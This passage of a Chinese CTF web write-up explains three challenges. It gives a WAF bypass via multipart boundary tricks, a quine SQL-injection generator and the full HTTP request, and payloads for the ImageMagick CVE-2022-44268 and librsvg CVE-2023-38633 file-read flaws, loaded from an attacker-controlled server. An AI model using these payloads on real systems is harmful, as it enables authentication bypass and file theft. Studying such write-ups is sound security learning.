</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="n">users</span><span class="p">:</span><span class="n">AdminUser</span> <span class="o">=</span> <span class="n">AdminUser</span><span class="o">.</span><span class="n">objects</span><span class="o">.</span><span class="n">raw</span><span class="p">(</span><span class="s2">&#34;SELECT * FROM blog_adminuser WHERE username=&#39;</span><span class="si">%s</span><span class="s2">&#39; and password =&#39;</span><span class="si">%s</span><span class="s2">&#39;&#34;</span> <span class="o">%</span> <span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">password</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">    <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">assert</span> <span class="n">password</span> <span class="o">==</span> <span class="n">users</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">password</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="k">return</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="s1">&#39;wrong password&#39;</span><span class="p">)</span>
</span></span></code></pre></div><p>这里存在sql注入</p>
<p>所以接下来的目标就是要想办法绕过waf，进行sql注入</p>
<p>可以利用multipart boundary来绕过waf，参考下面的这篇文章</p>
<p><a href="https://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86">https://www.geekby.site/2022/03/waf-bypass/#multipart-%E6%B7%B7%E6%B7%86</a></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/flag/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:7788</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Chromium&#34;;v=&#34;134&#34;, &#34;Not:A-Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;134&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://mitm/</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=a</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">--a
</span></span><span class="line"><span class="ln">19</span><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">admin
</span></span><span class="line"><span class="ln">22</span><span class="cl">--a
</span></span><span class="line"><span class="ln">23</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;filename=&#34;password&#34;
</span></span><span class="line"><span class="ln">24</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">123
</span></span><span class="line"><span class="ln">27</span><span class="cl">--a--
</span></span></code></pre></div><p>这题我们可以使用quine注入，即构造sql语句使我们输入和输出的结果一致，从而绕过</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">assert</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">users</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">password</span><span class="w">
</span></span></span></code></pre></div><p>参考文章：</p>
<p><a href="https://www.cnblogs.com/meraklbz/p/18169584">https://www.cnblogs.com/meraklbz/p/18169584</a></p>
<p>生成一个payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="k">def</span> <span class="nf">quine</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> 
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s2">&#34;REPLACE(REPLACE($$,CHAR(34),CHAR(39)),CHAR(36),$$)&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">    <span class="n">blob</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s1">&#39;&#34;$&#34;&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;&#39;&#34;</span><span class="p">,</span><span class="s1">&#39;&#34;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;$$&#39;</span><span class="p">,</span><span class="s2">&#34;&#39;&#34;</span><span class="o">+</span><span class="n">blob</span><span class="o">+</span><span class="s2">&#34;&#39;&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">if</span> <span class="n">debug</span><span class="p">:</span> 
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">        <span class="nb">print</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="k">return</span> <span class="n">data</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">data</span> <span class="o">=</span> <span class="n">quine</span><span class="p">(</span><span class="s2">&#34;1&#39; union select 1,2,$$--&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>完整payload</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nf">POST</span> <span class="nn">/flag/</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">127.0.0.1:7788</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">sec-ch-ua-mobile</span><span class="o">:</span> <span class="l">?0</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">Sec-Fetch-Site</span><span class="o">:</span> <span class="l">cross-site</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">Sec-Fetch-Dest</span><span class="o">:</span> <span class="l">document</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">sec-ch-ua-platform</span><span class="o">:</span> <span class="l">&#34;Windows&#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">sec-ch-ua</span><span class="o">:</span> <span class="l">&#34;Chromium&#34;;v=&#34;134&#34;, &#34;Not:A-Brand&#34;;v=&#34;24&#34;, &#34;Google Chrome&#34;;v=&#34;134&#34;</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://mitm/</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">Sec-Fetch-Mode</span><span class="o">:</span> <span class="l">navigate</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">Sec-Fetch-User</span><span class="o">:</span> <span class="l">?1</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.9</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br, zstd</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">multipart/form-data; boundary=a</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">
</span></span><span class="line"><span class="ln">18</span><span class="cl">--a
</span></span><span class="line"><span class="ln">19</span><span class="cl">Content-Disposition: form-data; name=&#34;username&#34;
</span></span><span class="line"><span class="ln">20</span><span class="cl">
</span></span><span class="line"><span class="ln">21</span><span class="cl">admin
</span></span><span class="line"><span class="ln">22</span><span class="cl">--a
</span></span><span class="line"><span class="ln">23</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;filename=&#34;password&#34;
</span></span><span class="line"><span class="ln">24</span><span class="cl">Content-Disposition: form-data; name=&#34;password&#34;;
</span></span><span class="line"><span class="ln">25</span><span class="cl">
</span></span><span class="line"><span class="ln">26</span><span class="cl">1&#39; union select 1,2,REPLACE(REPLACE(&#39;1&#34; union select 1,2,REPLACE(REPLACE(&#34;$&#34;,CHAR(34),CHAR(39)),CHAR(36),&#34;$&#34;)--&#39;,CHAR(34),CHAR(39)),CHAR(36),&#39;1&#34; union select 1,2,REPLACE(REPLACE(&#34;$&#34;,CHAR(34),CHAR(39)),CHAR(36),&#34;$&#34;)--&#39;)--
</span></span><span class="line"><span class="ln">27</span><span class="cl">--a--
</span></span></code></pre></div><p><img alt="image-20250316141627677" loading="lazy" src="../assets/image-20250316141627677.png"></p>
<h3 id="thumbor1">thumbor1<a hidden class="anchor" aria-hidden="true" href="#thumbor1">#</a></h3>
<p>thumbor是一个图片处理服务工具，可以对图片进行动态调整</p>
<p>附件只有一个dockerfile</p>
<p>可以起个docker拿一下源码</p>
<p><img alt="image-20250316142606897" loading="lazy" src="../assets/image-20250316142606897.png"></p>
<p>这题不是因为thumbor有问题，而是因为thumbor的一个组件ImageMagick存在任意文件读取漏洞，也就是CVE-2022-44268。</p>
<p><img alt="image-20250316194653409" loading="lazy" src="../assets/image-20250316194653409.png"></p>
<p>去GitHub找一个POC</p>
<p><a href="https://github.com/voidz0r/CVE-2022-44268">voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file read</a></p>
<p>从readme可以看到这里可以通过类似ssrf的方式远程加载图片</p>
<p><img alt="image-20250316200524558" loading="lazy" src="../assets/image-20250316200524558.png"></p>
<p>在vps上构造好png，远程加载即可</p>
<pre tabindex="0"><code>http://localhost:8800/thumbor/unsafe/450x/YOUR_IP/图片
</code></pre><p>其实就是复现cve</p>
<h3 id="thumbor2">thumbor2<a hidden class="anchor" aria-hidden="true" href="#thumbor2">#</a></h3>
<p>dockerfile里面增加了最新版的ImageMagick，其实就是修复了上一题的ImageMagick</p>
<p>这题是另一个组件librsvg的漏洞，CVE-2023-38633</p>
<blockquote>
<p>librsvg 2.56.3 之前版本中 URL 解码器的目录遍历问题，可以被本地或远程攻击者用来泄露文件（在预期区域之外的本地文件系统上），例如通过在 xi:include 元素中使用 href=“.?../…/…/…/…/…/…/…/…/…/etc/passwd” 来读取结果。
原文链接：https://blog.csdn.net/HMX404/article/details/137231580</p></blockquote>
<p>原理参考文章：</p>
<p><a href="https://www.canva.dev/blog/engineering/when-url-parsers-disagree-cve-2023-38633/">When URL parsers disagree (CVE-2023-38633) - Canva Engineering Blog</a></p>
<p>payload：</p>
<pre tabindex="0"><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;no&#34;?&gt;  
&lt;svg width=&#34;3000&#34; height=&#34;3000&#34; xmlns:xi=&#34;http://www.w3.org/2001/XInclude&#34;&gt;  
   &lt;rect width=&#34;3000&#34; height=&#34;3000&#34; style=&#34;fill:rgb(255,255,255);&#34; /&gt;  
   &lt;text x=&#34;0&#34; y=&#34;1500&#34; font-size=&#34;100&#34;&gt;  
     &lt;xi:include href=&#34;.?../../../../../../../../flag&#34; parse=&#34;text&#34;   
encoding=&#34;UTF-8&#34;&gt;  
       &lt;xi:fallback&gt;file not found&lt;/xi:fallback&gt;  
     &lt;/xi:include&gt;  
   &lt;/text&gt;  
&lt;/svg&gt;
</code></pre><p>跟上题差不多，在服务器上创建一个txt，将payload写进去，远程加载即可</p>
<pre tabindex="0"><code>http://localhost:8800/thumbor/unsafe/450x/YOUR_IP/poc.txt
</code></pre>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="http://localhost:1313/tags/writeup/">Writeup</a></li>
      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-brute4road-writeup/">
    <span class="title">« 上一页</span>
    <br>
    <span>春秋云镜-Brute4Road-Writeup</span>
  </a>
  <a class="next" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/">
    <span class="title">下一页 »</span>
    <br>
    <span>春秋云镜-Initial-Writeup</span>
  </a>
</nav>

  </footer><div id="tw-comment"></div>
<script>
    
    const getStoredTheme = () => localStorage.getItem("pref-theme") === "light" ? "light" : "dark";
    const setGiscusTheme = () => {
        const sendMessage = (message) => {
            const iframe = document.querySelector('iframe.giscus-frame');
            if (iframe) {
                iframe.contentWindow.postMessage({giscus: message}, 'https://giscus.app');
            }
        }
        sendMessage({setConfig: {theme: getStoredTheme()}})
    }

    document.addEventListener("DOMContentLoaded", () => {
        const giscusAttributes = {
            "src": "https://giscus.app/client.js",
            "data-repo": "sonnycalcr\/sonnycalcr.github.io",
            "data-repo-id": "xxxxxx",
            "data-category": "Announcements",
            "data-category-id": "xxxxx",
            "data-mapping": "pathname",
            "data-strict": "0",
            "data-reactions-enabled": "1",
            "data-emit-metadata": "0",
            "data-input-position": "bottom",
            "data-theme": getStoredTheme(),
            "data-lang": "zh-CN",
            "data-loading": "lazy",
            "crossorigin": "anonymous",
        };

        
        const giscusScript = document.createElement("script");
        Object.entries(giscusAttributes).forEach(
                ([key, value]) => giscusScript.setAttribute(key, value));
        document.querySelector("#tw-comment").appendChild(giscusScript);

        
        const themeSwitcher = document.querySelector("#theme-toggle");
        if (themeSwitcher) {
            themeSwitcher.addEventListener("click", setGiscusTheme);
        }
        const themeFloatSwitcher = document.querySelector("#theme-toggle-float");
        if (themeFloatSwitcher) {
            themeFloatSwitcher.addEventListener("click", setGiscusTheme);
        }
    });
</script>
</article>
    </main>
    
<footer class="footer">
        <span><a href="https://blog.xrntkk.top/">©2024 Xrntkk&rsquo;s Blog</a></span> · 


    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
    <div class="busuanzi-footer">
        <span id="busuanzi_container_site_pv">Site Visits：<span id="busuanzi_value_site_pv"></span></span>
    </div></footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = '复制';

        function copyingDone() {
            copybutton.innerHTML = '已复制！';
            setTimeout(() => {
                copybutton.innerHTML = '复制';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
